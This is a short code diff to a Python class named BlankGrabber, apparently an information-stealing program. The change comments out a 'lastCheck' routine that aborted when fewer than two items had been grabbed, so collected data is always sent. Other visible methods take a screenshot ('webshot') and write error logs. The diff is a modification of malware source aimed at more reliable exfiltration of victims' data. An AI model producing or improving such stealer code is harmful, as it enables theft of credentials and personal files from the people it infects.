@@ -218,7 +218,7 @@ class BlankGrabber:
         for t in threads:
             t.join()
         self.errorReport()
-        self.lastCheck()
+        #self.lastCheck()
         self.send()
     
     def errorReport(self):
@@ -226,12 +226,12 @@ class BlankGrabber:
             with open(os.path.join(self.tempfolder, "Error Logs.txt"), "w") as file:
                 file.write("\n".join(_errorlogs))
     
-    def lastCheck(self):
-        filescount = 0
-        for _, value in self.grabbed_data.items():
-            filescount += value
-        if filescount < 2:
-            os._exit(1)
+    #def lastCheck(self):
+#        filescount = 0
+#        for _, value in self.grabbed_data.items():
+#            filescount += value
+#        if filescount < 2:
+#            os._exit(1)
 
     @catch
     def webshot(self):
